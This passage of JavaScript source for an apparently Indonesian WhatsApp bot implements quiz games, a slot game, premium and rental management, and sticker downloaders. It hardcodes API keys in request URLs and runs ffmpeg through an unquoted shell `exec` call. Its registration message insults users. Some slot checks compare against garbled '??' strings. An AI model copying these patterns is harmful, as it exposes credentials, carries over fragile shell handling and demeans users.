  get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebakchara?apikey=Mythia-Chan`)
get_result = get_result.result
ini_image = get_result.image
jawaban = get_result.name
kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
ini_buffer = await getBuffer(ini_image)
kahfzz.sendMessage(from, ini_buffer, image, { quoted: freply, caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s' }).then(() => {
  tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
})
await sleep(30000)
if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
  titid = "*Jawaban*: " + jawaban
  sendButMessage(from, titid, `Klik Untuk Ke Game`, [
  {
 buttonId: `${prefix}tebakanime`,
 buttonText: {
displayText: `⬡ NEXT `,
 },
 type: 1,
  },]);

  delete tebakanime[sender.split('@')[0]]
  fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
}
gameAdd(sender, glimit)
break
case 'tebaklagu':
if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
  if (tebaklagu.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
 get_result = await fetchJson(`https://api.xteam.xyz/game/tebaklagu?apikey=${setting.xteamkey}&id=4mFuArYRh3SO8jfffYLSER`)
  get_result = get_result.result
  ini_audio = get_result.preview
  jawaban = get_result.judul
  kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
  ini_buffer = await getBuffer(ini_audio)
  reply('*+* ```Tebak Lagu```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s')
  kahfzz.sendMessage(from, ini_buffer, audio, {quoted: freply}).then(() => {
 tebaklagu[sender.split('@')[0]] = jawaban.toLowerCase()
 fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
  })
  await sleep(30000)
  if (tebaklagu.hasOwnProperty(sender.split('@')[0])) {
 console.log(color("Jawaban: " + jawaban))
 titid = "*Jawaban*: " + jawaban
 sendButMessage(from, titid, `Klik Untuk Ke Game`, [
 {
buttonId: `${prefix}tebaklagu`,
buttonText: {
  displayText: `⬡ NEXT `,
},
type: 1,
 },]);

 delete tebaklagu[sender.split('@')[0]]
 fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
  }
  gameAdd(sender, glimit)
  break
  case 'tebaktebakan':
  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
 if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${setting.xteamkey}`)
 get_result = get_result.result
 jawaban = get_result.jawaban
 kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
 pertanyaan = get_result.soal
 kahfzz.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
 })
 await sleep(30000)
 if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {
console.log(color("Jawaban: " + jawaban))
titid = "*Jawaban*: " + jawaban
sendButMessage(from, titid, `Klik Untuk Ke Game`, [
{
  buttonId: `${prefix}tebaktebakan`,
  buttonText: {
 displayText: `⬡ NEXT `,
  },
  type: 1,
},]);

delete tebaktebakan[sender.split('@')[0]]
fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
 }
 gameAdd(sender, glimit)
 break
 case 'kuismath':
 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (kuismath.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
  get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/kuis/math`)
ini_image = get_result.soal
jawaban = get_result.jawaban
ini_buffer = await getBuffer(ini_image)
kahfzz.sendMessage(from, ini_buffer, image, { quoted: freply, caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s' }).then(() => {
  kuismath[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
})
await sleep(50000)
if (kuismath.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
  titid = "*Jawaban*: " + jawaban
  sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [
  {
 buttonId: `${prefix}kuismath`,
 buttonText: {
displayText: `⬡ NEXT `,
 },
 type: 1,
  },]);

  delete kuismath[sender.split('@')[0]]
  fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
}
gameAdd(sender, glimit)
break
case 'tebakgambar':
if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/gambar?apikey=${setting.lolkey}`)
get_result = get_result.result
ini_image = get_result.image
jawaban = get_result.answer
ini_buffer = await getBuffer(ini_image)
kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
buff = await getBuffer(ini_image)

kahfzz.sendMessage(from, ini_buffer, image, { quoted: freply, caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :'+kisi_kisi+'\nWaktu : 30s' }).then(() => {
  tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
})
await sleep(30000)
if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
  titid = "*Jawaban*: " + jawaban
  sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [
  {
 buttonId: `${prefix}tebakgambar`,
 buttonText: {
displayText: `⬡ NEXT `,
 },
 type: 1,
  },]);

  delete tebakgambar[sender.split('@')[0]]
  fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
}
gameAdd(sender, glimit)
break
case 'siapaaku':
if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
  if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
 get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/siapaaku?apikey=Mythia-Chan`)
  get_result = get_result.result
  jawaban = get_result.answer
  kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
  pertanyaan = get_result.question
  kahfzz.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
 tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()
 fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
  })
  await sleep(30000)
  if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) {
 console.log(color("Jawaban: " + jawaban))
 reply("Jawaban: " + jawaban)
 delete tebaksiapaaku[sender.split('@')[0]]
 fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
  }
  gameAdd(sender, glimit)
  break
  case 'tebakkata':
  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
 if (tebakata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/kata?apikey=Mythia-Chan`)
 get_result = get_result.result
 jawaban = get_result.jawaban
 pertanyaan = get_result.pertanyaan
 kahfzz.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {
tebakata[sender.split('@')[0]] = jawaban.toLowerCase()
fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
 })
 await sleep(30000)
 if (tebakata.hasOwnProperty(sender.split('@')[0])) {
console.log(color("Jawaban: " + jawaban))
reply("Jawaban: " + jawaban)
delete tebakata[sender.split('@')[0]]
fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
 }
 gameAdd(sender, glimit)
 break
 case 'tebaklirik':
 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
  get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/lirik?apikey=Mythia-Chan`)
get_result = get_result.result
jawaban = get_result.answer
kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
pertanyaan = get_result.question
kahfzz.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
  tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
})
await sleep(30000)
if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
  reply("Jawaban: " + jawaban)
  delete tebaklirik[sender.split('@')[0]]
  fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
}
gameAdd(sender, glimit)
break
case 'tebakjenaka':
if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
  if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
 get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/jenaka?apikey=Mythia-Chan`)
  get_result = get_result.result
  jawaban = get_result.answer
  kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
  pertanyaan = get_result.question
  kahfzz.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
 tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()
 fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
  })
  await sleep(30000)
  if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {
 console.log(color("Jawaban: " + jawaban))
 reply("Jawaban: " + jawaban)
 delete tebakjenaka[sender.split('@')[0]]
 fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
  }
  gameAdd(sender, glimit)
  break
  case 'kimiakuis':
  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
 if (tebakimia.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/unsurkimia?apikey=Mythia-Chan`)
 get_result = get_result.result
 jawaban = get_result.lambang
 pertanyaan = get_result.nama
 kahfzz.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {
tebakimia[sender.split('@')[0]] = jawaban.toLowerCase()
fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
 })
 await sleep(30000)
 if (tebakimia.hasOwnProperty(sender.split('@')[0])) {
console.log(color("Jawaban: " + jawaban))
reply("Jawaban: " + jawaban)
delete tebakimia[sender.split('@')[0]]
fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
 }
 gameAdd(sender, glimit)
 break
case 'artinama':

              if (args.length == 0) return reply(`Example: ${prefix + command} hafizh`)

              query = args.join(" ")

              asw = await fetchJson(`https://leyscoders-api.herokuapp.com/api/artinama?q=${query}&apikey=dappakntlll`)

              ngontol = await getBuffer(asw.result)  

              teksnyaa = `ARTI NAMA\n${asw.result}[ *ARTI NAMA BY KAHFZ BOTZ* ]` 

              kahfzz.sendMessage(from, teksnyaa, text, { quoted: freply})  

              break
case 'artimimpi':

              if (args.length == 0) return reply(`Example: ${prefix + command} digigit ular`)

              query = args.join(" ")

              asw = await fetchJson(`https://leyscoders-api.herokuapp.com/api/artimimpi?q=${query}&apikey=dappakntlll`)

              ngontol = await getBuffer(asw.result)  

              teksnyaa = `ARTI MIMPI\n${asw.result}[ *ARTI MIMPI BY KAHFZ BOTZ* ]` 

              kahfzz.sendMessage(from, teksnyaa, text, { quoted: freply})  

              break
 case 'tebakbendera':
 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
  get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/bendera?apikey=Mythia-Chan`)
get_result = get_result.result
jawaban = get_result.name
kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
pertanyaan = get_result.flag
kahfzz.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
  tebakbendera[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
})
await sleep(30000)
if (tebakbendera.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
  reply("Jawaban: " + jawaban)
  delete tebakbendera[sender.split('@')[0]]
  fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
}
gameAdd(sender, glimit)
break
case 'susunkata':
if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
  if (susunkata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
 get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/susunkata?apikey=Mythia-Chan`)
  get_result = get_result.result
  jawaban = get_result.jawaban
  pertanyaan = get_result.pertanyaan
  kahfzz.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {
 susunkata[sender.split('@')[0]] = jawaban.toLowerCase()
 fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
  })
  await sleep(30000)
  if (susunkata.hasOwnProperty(sender.split('@')[0])) {
 console.log(color("Jawaban: " + jawaban))
 reply("Jawaban: " + jawaban)
 delete susunkata[sender.split('@')[0]]
 fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
  }
  gameAdd(sender, glimit)
  break
case 'perkalian':

              if (args.length == 0) return reply(`Example: ${prefix + command} 71|51`)

              get_args = args.join(" ").split("|")

              angkanya = get_args[0]

              angkadua = get_args[1]

              asw = await fetchJson(`https://leyscoders-api.herokuapp.com/api/perkalian?angka1=${angkanya}&angka2=${angkadua}&apikey=dappakntlll`)

              ngontol = await getBuffer(asw.result)  

              teksnyaa = `[ PERKALIAN ]\n${asw.result}[ *PERKALIAN BY KAHFZ BOTZ* ]` 

              kahfzz.sendMessage(from, teksnyaa, text, { quoted: freply})  

              break
  case 'asahotak':
  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
 if (asahotak.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/asahotak?apikey=Mythia-Chan`)
 get_result = get_result.result
 jawaban = get_result.jawaban
 kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
 pertanyaan = get_result.pertanyaan
 kahfzz.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
asahotak[sender.split('@')[0]] = jawaban.toLowerCase()
fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
 })
 await sleep(30000)
 if (asahotak.hasOwnProperty(sender.split('@')[0])) {
console.log(color("Jawaban: " + jawaban))
reply("Jawaban: " + jawaban)
delete asahotak[sender.split('@')[0]]
fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
 }
 gameAdd(sender, glimit)
 break
 case 'caklontong':
 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
  get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/caklontong2?apikey=Mythia-Chan`)
get_result = get_result.result
jawaban = get_result.answer
kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
pertanyaan = get_result.question
kahfzz.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
  caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
})
await sleep(30000)
if (caklontong.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
  reply("Jawaban: " + jawaban)
  delete caklontong[sender.split('@')[0]]
  fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
}
gameAdd(sender, glimit)
break
case 'slot':
const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : ??','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
if (somtoyy  == '🍌 : 🍌 : 🍌') {
  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
} else if (somtoyy == '?? : 🍒 : 🍒') {
  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
} else if (somtoyy == '🔔 : ?? : 🔔') {
  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
} else if (somtoyy == '?? : 🍐 : 🍐') {
  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
} else if (somtoyy == '🍇 : ?? : 🍇') {
  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
} else {
  reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
}
break
 case 'suit': //nyolong dari zenz
 if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
  const userspilih = q
if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
  var computer = Math.random();
if (computer < 0.34 ) {
  computer = 'batu';
} else if( computer >= 0.34 && computer < 0.67) {
  computer = 'gunting';
} else {
  computer = 'kertas';
}
if ( userspilih == computer ) {
  reply(`Pertandingan Seri!`)
} else if ( userspilih == 'batu' ) {
  if( computer == 'gunting' ) {
 reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
  } else {
 reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
  }
} else if ( userspilih == 'gunting' ) {
  if( computer == 'batu' ) {
 reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
  } else {
 reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
  }
} else if ( userspilih == 'kertas' ) {
  if( computer == 'batu' ) {
 reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
  } else {
 reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
  }
}
break
//------------------< Sewa >-------------------
case 'sewa':
if (!isGroup)return reply(mess.only.group)
  if (!isOwner) return reply(mess.only.owner)
 if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
if (args[0].toLowerCase() === 'add'){
  _sewa.addSewaGroup(from, args[1], sewa)
  reply(`Success`)
} else if (args[0].toLowerCase() === 'del'){
  sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
  fs.writeFileSync('./database/group/sewa.json', JSON.stringify(sewa))
  reply(mess.success)
} else {
  reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
}
break
case 'sewalist': 
case 'listsewa':
let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
for (let i of sewa){
  let cekvipp = ms(i.expired - Date.now())
  txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
}
reply(txtnyee)
break
case 'verify':

if (isRegistered) return reply('Akun kamu sudah terverfikasi')
  const serialUser = createSerial(18)
try {
  ppimg = await kahfzz.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
  ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
veri = sender
_registered.push(sender)
fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
const anuu = `「 *PENDAFTARAN USER* 」
*Thanks Telah Terdaftar Di Kahfz Bot ☕*

き⃟*🌹 Nama :* ${pushname}
き⃟*🌹 API :* +${sender.split('@')[0]}
き⃟*🌹 Serial:* ${serialUser}
き⃟*🌹 Total:* ${_registered.length} Pengguna


*_SELAMAT ANDA JADI GOBLOK SEUMUR HIDUP_* 
*_MAU GAK JADI GOBLOK? CHAT OWNER UNTUK DI RUQYAH_*

*「 Kahfz Ganteng Awowkwok 」*`
ikyads = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)
buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `🏷️MENU`},type:1},{buttonId: noprefix ? "donasi" : "!"+"donasi",buttonText:{displayText: `DONASI☕`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(ikyads, "imageMessage", { thumbnail: ikyads, })).imageMessage
buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
contentText:`${anuu}`,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
kahfzz.relayWAMessage(prep)
console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	 // console.log(e)
setTimeout( () => {
 kahfzz.updatePresence(from, Presence.composing)
 reply(`*Terimakasih Telah Terdaftar Di Kahfz Bot 🖕🖕*`)
  }, 2000)
break
case 'sfire1':{

  if (isImage || isQuotedImage) {
 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 var link = await uptotele(yoooo)
 kahfzz.sendSticker(from, `https://api.zeks.xyz/api/burning-image?apikey=${zekskey}&image=${link}`, msg).then((res) => fs.unlinkSync(yoooo))

  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 let ran = getRandom('.png')
 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return reply('Gagal :V')
  var link = await uptotele(ran)
kahfzz.sendSticker(from, `https://api.zeks.xyz/api/burning-image?apikey=${zekskey}&image=${link}`, msg).then((res) => fs.unlinkSync(ran))

 })
  } else {
reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
 }
  }
  break
  case 'findsticker': case 'findstiker': case 'stickerwa':{

if (!q) return reply(`Cara penggunaan : ${command} kucing`)
  fetchJson(`https://api.lolhuman.xyz/api/stickerwa?apikey=${lolkey}&query=${q}`).then((data) => {
 var bokepp = JSON.parse(JSON.stringify(data.result))
 var bokep2 =  bokepp[Math.floor(Math.random() * bokepp.length)]
 if (bokep2.stickers.length > 15 && isGroup) return reply("Terdeteksi sticker melebihi 15, harap download melalui personal chat untuk menghindari spam")
for (var x of bokep2.stickers) {
  kahfzz.sendSticker(from, x, msg)
}

 })
 }
 break
 case 'linedl': case 'linestickerdl':{

if (args.length < 2) return reply(`Kirim perintah *${command}* link sticker_line`)
  if (!isUrl(args[1]) && !args[1].includes('store.line')) return reply(mess.error.Iv)
 fetchJson(`https://api.lolhuman.xyz/api/linestick?apikey=${lolkey}&url=${args[1]}`).then(async(data) => {
if (data.result.stickers.length > 15 && isGroup) return reply("Terdeteksi sticker melebihi 15, harap download melalui personal chat untuk menghindari spam")
  for (var x of data.result.stickers) {
 kahfzz.sendSticker(from, x, msg)
  }

})
}
break
case 'teledl': case 'telegramdl': case 'telesticker':{

  if (args.length < 2) return reply(`Kirim perintah *${command}* link sticker_telegram`)
 if (!isUrl(args[1]) && !args[1].includes('t.me')) return reply(mess.error.Iv)
fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${lolkey}&url=${args[1]}`).then(async(data) => {
  if (data.result.sticker.length > 15 && isGroup) return reply("Terdeteksi sticker melebihi 15, harap download melalui personal chat untuk menghindari spam")
 for (var x of data.result.sticker) {
kahfzz.sendSticker(from, x, msg)
 }

  })
  }
  break
  break
  case 'sewacheck':
  case 'ceksewa': 
  if (!isGroup) return reply(mess.only.group)
 if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
 let premiumnya = `*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${from}\n➸ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
 reply(premiumnya)
 break
//------------------< Premium >-------------------
case 'premium': 
if (!isOwner || kahfz.key.fromMe) return reply(mess.only.owner)
  if (args[0] === 'add') {
 if (kahfz.message.extendedTextMessage != undefined) {
mentioned = kahfz.message.extendedTextMessage.contextInfo.mentionedJid

premium.addPremiumUser(mentioned[0], args[2], _premium)
reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)

 } else {

premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
 }
  } else if (args[0] === 'del') {
 if (kahfz.message.extendedTextMessage != undefined) {
mentioned = kahfz.message.extendedTextMessage.contextInfo.mentionedJid
_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
reply(mess.success)
 } else {
_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
reply(mess.success)
 }
  } else {
 reply(mess.wrongFormat)
  }
  break
  case 'premiumcheck':
  case 'cekpremium': 
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
 const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
  reply(`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
  break
  case 'listprem':
  case 'listpremium': 
  let txt = `「 *PREMIUM USER LIST* 」\n\n`
  let men = [];
  for (let i of _premium){
 men.push(i.id)
 const checkExp = ms(i.expired - Date.now())
 txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
  }
